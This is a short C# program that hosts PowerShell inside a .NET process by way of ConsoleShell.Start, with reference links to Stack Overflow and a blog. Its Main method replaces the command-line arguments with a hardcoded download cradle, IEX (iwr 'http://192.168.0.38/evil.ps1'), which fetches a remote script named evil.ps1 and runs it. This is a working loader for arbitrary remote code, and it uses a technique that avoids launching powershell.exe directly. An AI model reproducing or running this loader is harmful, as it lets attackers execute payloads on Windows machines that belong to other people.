/**
 * Using .Net to run Powershell
 * 
 * Ref:
 * https://stackoverflow.com/questions/2094694/how-can-i-run-powershell-with-the-net-4-runtime
 * http://community.bartdesmet.net/blogs/bart/archive/2010/07/06/hosting-windows-powershell-2-0-under-clr-4-0.aspx (option 2)
 *
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation.Runspaces;
using Microsoft.PowerShell;

namespace DotNetToPsh
{
    class Program
    {
        static int Main(string[] args)
        {
            args = new[] { "IEX (iwr 'http://192.168.0.38/evil.ps1')" };
            var config = RunspaceConfiguration.Create();
            return ConsoleShell.Start(
            config,
            "Windows PowerShell - Hosted on CLR v4\nCopyright (C) 2010 Microsoft Corporation. All rights reserved.",
            "",
            args
        );
            
        }
    }
}
